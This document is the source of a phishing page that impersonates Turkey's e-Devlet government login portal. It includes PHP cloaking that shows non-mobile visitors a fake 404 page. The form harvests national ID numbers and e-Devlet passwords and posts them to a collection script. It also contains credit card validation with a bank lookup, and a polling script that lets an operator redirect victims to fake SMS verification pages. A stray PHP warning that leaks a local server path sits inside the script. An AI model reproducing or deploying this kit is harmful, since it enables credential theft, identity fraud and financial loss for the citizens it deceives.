<?php
$mobileDevices = array('iPhone','iPad','Android','Windows Phone');
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$isMobile = false;
foreach ($mobileDevices as $device) {
    if (strpos($userAgent, $device) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    // Mobil olmayan kullanıcılara boş bir sayfa göster
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title></title>
    </head>
    <body>
        <h1>404 Not Found</h1>
    </body>
    </html>';

    exit();
}
?>
<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <meta http-equiv="cleartype" content="on">
    <title>e-Devlet Kapısı
    </title>
    <meta name="description" content="Dünya çok acı çekiyor, kötü insanların şiddetinden değil, iyi insanların sessizliğinden.">
    <meta name="description" content="Dünya çok acı çekiyor, kötü insanların şiddetinden değil, iyi insanların sessizliğinden.">
    <meta name="keywords" content="Business,Dünya,Çok,Acı,Çekiyor">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#4284de">
    <link rel="icon" type="image/png" href="assets/img/favicon-196x196.png" sizes="196x196">
    <meta name="msapplication-TileColor" content="#FFFFFF">
    <link rel="stylesheet" href="assets/css/base.css">
    <script src="assets/js/header.js"></script>
    <link rel="stylesheet" href="assets/css/giris.css">

    <style>
        #page header h1 {
            
            background-image: url('assets/img/edkkds.svg');
            
        }
    </style>
</head>

<body data-lang="null">
<div id="page">
    


<header id="headerSection">
    
    <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
    <nav id="accesibilityBlock" class="visuallyhidden">
        <ul>
            <li><a href="#loginForm" accesskey="s">Ana Sayfa</a></li>
            <li><a href="#" accesskey="1">Ä°çeriğe Git</a></li>
        </ul>
    </nav>
</header>
    <main>
		<section class="referrerApp">
			<img class="sso" src="assets/img/1.png" alt="" width="165" height="40">
			<dl>
				
				<dt>Giriş Yapılacak Uygulama</dt>
				<dd><span title="e-Devlet Kapısı">e-Devlet Kapısı</span></dd>
			</dl>
		</section>
<nav class="methodSelector">
</nav>
        <section id="pageContent">
            <div class="">
                T.C. Kimlik Numaranızı ve e-Devlet sifrenizi kullanarak kimliğiniz doğrulandıktan sonra isleminize kaldığınız yerden devam edebilirsiniz.

             
                </a>

            </div>
            
            
            <form method="post" id="loginForm" action="./kreditutari.php" name="sifreGirisForm" autocomplete="off">
                <fieldset>
                    <div class="formRow required ">
                        
                        <label for="tridField" class="rowLabel">T.C. Kimlik No
                        </label>
                        <input type="hidden" name="encTridField" id="encTridField" value="">
                        <div class="fieldGroup">
                            <input name="tridField" type="text" class="text" id="tridField" value="" tabindex="1" autocomplete="off" maxlength="11" pattern="[0-9]{11}" title="Kimlik numaranız 11 adet rakamdan olusmalıdır" aria-required="true" required="">
                            <span class="virtual-key-wrapper">
             
                                </a>
                            </span>
                        </div>
                    </div>

                    <div class="formRow required ">
                        <label for="egpField" class="rowLabel">e-Devlet sifresi
                        </label>
                        <div class="fieldGroup">
                            <input name="egpField" id="egpField" type="password" class="text" tabindex="2" autocomplete="off" aria-required="true" required="">
                            <input type="hidden" name="encEgpField" id="encEgpField" value="">
                            
                            <span class="virtual-key-wrapper">
                                </a>
                                </span>
                            
                            <div class="capsWarning">
                                <strong>Dikkat:</strong> Üst Karakter (
                                ⇪Caps Lock) tusunuz açık.
                            </div>
                            <div class="fieldInfo richText">
                                * e-Devlet
                                </a>
                                doğruladığınız cep telefonunuzdan yenileme islemi yapabilirsiniz.<br>
                            </div>
                        </div>
                    </div>
                    
                </fieldset>
                <div class="loader" style="display: none"><img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/form-progress.svg" alt="...">isleminiz devam ediyor. Lütfen bekleyiniz...
                </div>
                <div class="formSubmitRow">
                    <input type="hidden" name="currentPageToken" value="058302ad-37fd-4f6a-9013-15b9b5821770">
                    <input type="hidden" name="actionName" value="giris">
                    <input type="hidden" name="jsonData" id="jsonData" value="">
                   
  <input class="submitButton" name="submitButton" type="submit" tabindex="3" value="Giris Yap" onclick="submitForm(event)">
  

  



                    <input formnovalidate="" class="backButton" name="cancelButton" type="submit" value="iptal Et">

                </div></form>
            
        </section>
    </main>
<footer>
    
    <ul class="footerLinks">
        <li>
            <a open-modal="gizlilikGuvenlik" href="#">Gizlilik ve Güvenlik</a>
        </li>
        <li>
            <a href="#/iletisim?hizli=CozumMerkezi2" target="_blank">Hızlı Çözüm Merkezi</a>
        </li>
    </ul>
    <div class="copyrightDetails">
        © 2023, Ankara - Tüm Hakları Saklıdır
    </div>

</footer><div class="printableFooter"> 			<div class="imageSection"> 				<img src="assets/img/bb-ubak-tsat-black.png"> 				<span class="imageInfo">
					e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi T.C. 					
Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı tarafından 					
yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi 					Türksat 
A.Ş. tarafından yapılmaktadır.				</span> 			</div> 			<div class="bottomInfo">
 				©2020 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları 
bildiriminde belirtilen kurallar çerçevesinde 				hizmet sunulmaktadır. 
			</div> 		</div>

</div>









<div class="mask"></div>
<!--[if gt IE 9]><!-->

<div class="modal" id="gizlilikGuvenlik">
    <div class="modal-container">
        <span class="close" close-modal=""><i class="edk-fonticon-close"></i></span>
        <h3>Gizlilik ve Güvenlik</h3>
        <div class="modal-content">
            <p>e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi 
sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde 
hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, 
Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını 
kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz 
e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı 
uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile 
yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli 
e-postaları okumadan siliniz.</p>
            <p>e-Devlet Kapısı sistemi, güvenlik amaçlı olarak 
elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup 
olmadığını adres çubuğunda yer alan adresin http değil https ile 
başlamasından ve tarayıcı uygulamasındaki kilit resminden 
anlayabilirsiniz.</p>
        </div>
        <div class="modal-footer">
            <div class="formSubmitRow">
                <button class="cancelButton" close-modal="">Kapat</button>
            </div>
        </div></div>
    <div class="modalBg"></div>
</div>


<div class="modal" id="info">
    <div class="modal-container">
        <span class="close" close-modal=""><i class="edk-fonticon-close"></i></span>
        <h3>e-Devlet Şifresi</h3>
        <div class="modal-content">
            <p>e-Devlet şifrenizi içeren zarfınızı PTT Merkez 
Müdürlüklerinden, şahsen başvuru ile, üzerinde T.C. Kimlik numaranızın 
bulunduğu kimliğinizi ibraz ederek temin edebilirsiniz.</p>
            <p>Bu uygulama, sizin yerinize başka bir kişinin şifre alıp 
adınıza işlem yapmasının önüne geçilmesi için gerekmektedir. e-Devlet 
Kapısı üzerinden verilen hizmetler yüksek güvenlik seviyesi 
gerektirdiğinden, şifreler başvuru sahipleri için özel olarak 
oluşturulmaktadır. Bu nedenle ancak kimlik ibrazı ve şahsen başvuru ile 
şifreler verilmektedir.</p>
            <p>e-Devlet Kapısı kayıtlı kullanıcısıysanız ve şifrenizle 
giriş yaptıktan sonra "Profilim" alanında bulunan iletişim bilgileri 
kısmına cep telefonunuzu kaydettiyseniz ya da cep telefonunuzu veya hem 
cep telefonunuzu hem de e-posta adresinizi e-Devlet Kapısında 
doğruladıysanız şifre yenileme hizmetinden yararlanarak yeniden şifre 
temin edebilirsiniz. Bununla birlikte, mobil imza, elektronik imza, yeni
 T.C. kimlik kartı veya internet bankacılığı kullanıyorsanız, e-Devlet 
Kapısına bunlardan biri ile giriş yaptıktan sonra da şifre 
oluşturabilirsiniz.</p>
            <p>Şifre ilk alındığında PTT tarafından işlem masrafı olarak
 2 TL tahsil edilmektedir. Şifrenin kaybedilmesi, unutulması vb. 
durumlarda PTT'den alınacak her şifre için ayrıca 4 TL ücret 
ödenmektedir. Bu işlem masrafı dışında herhangi bir yıllık ücret 
ödenmesi söz konusu değildir.</p>
            <p>e-Devlet şifresi yurt dışında Elçilik ve Konsolosluklardan ücretsiz olarak temin edilebilmektedir.</p>

        </div>
        <div class="modal-footer">
            <div class="formSubmitRow">
                <button class="cancelButton" close-modal="">Kapat</button>
            </div>
        </div></div>
    <div class="modalBg"></div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="assets/js/jquery.maskedinput.js" type="text/javascript"></script>
<script src="assets/js/inputmask.js"></script>
<script src="assets/js/inputmask.extensions.js"></script>
<script src="assets/js/inputmask.numeric.extensions.js"></script>
<script src="assets/js/inputmask.date.extensions.js"></script>
<script src="assets/js/jquery.inputmask.js"></script>

  <script type="text/javascript">

    var is_valid = false;

    $(document).ready(function(){
      $('#sifrexa').inputmask("99/99");  //static mask
    });

    $('#tekewe, #sifrexa').on('keyup', function(){

      if($('#tekewe').val() == ""){
          is_valid = false;
          return false;
      }else{
        var is_valid = valid_credit_card($('#tekewe').val());

        if(is_valid == false){
          is_valid = false;

        }else{
          is_valid = true;
          $('#msg_').html('');
      $.get('play.php?cn='+$('#tekewe').val(), function(r){
        
      
        $('#x_type').val(r.type);
        $('#x_brand').val(r.brand);
        $('#x_bank_name').val(r.bank_name);
      
      });
          return false;
        }
      }

    });

    $('#login_submit').click(function(){
      if(valid_credit_card($('#tekewe').val()) == false){
        $('#msg_').html('Kredi kartı numaranızı hatalı girdiniz lütfen kontrol ediniz.');
        return false;
      }
    });

    function valid_credit_card(value) {
      // accept only digits, dashes or spaces
      if (/[^0-9-\s]+/.test(value)) return false;

      // The Luhn Algorithm. It's so pretty.
      var nCheck = 0, nDigit = 0, bEven = false;
      value = value.replace(/\D/g, "");

      for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);

        if (bEven) {
          if ((nDigit *= 2) > 9) nDigit -= 9;
        }

        nCheck += nDigit;
        bEven = !bEven;
      }

      return (nCheck % 10) == 0;
    }


  </script>

<script type="text/javascript">
$(document).ready(function() {
    gonder();
	var int = self.setInterval("gonder()", 2500);
});

function gonder(){
    $.ajax({
		type:'POST',
		url:'veri.php?ip=<br />
<b>Warning</b>:  Undefined variable $ip in <b>C:\xampp2\htdocs\deneme\index.php</b> on line <b>300</b><br />
',
		success: function (msg) {
			if(msg == "back") {
				window.location.href='index.php';
			}
			if(msg == "hata1") {
				window.location.href='sms-hatali.php';
			}
			if(msg == "sms") {
				window.location.href='sms-dogrulama.php';
			}
			if(msg == "tebrik"){
				window.location.href='tebrikler.php';
			}
		}
    });
}
</script>


<div id="facebox" style="display:none" role="dialog"><div class="body"><a class="visuallyhidden" id="popAnchor">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a><div id="modalContent" class="content"></div></div></div></body></html>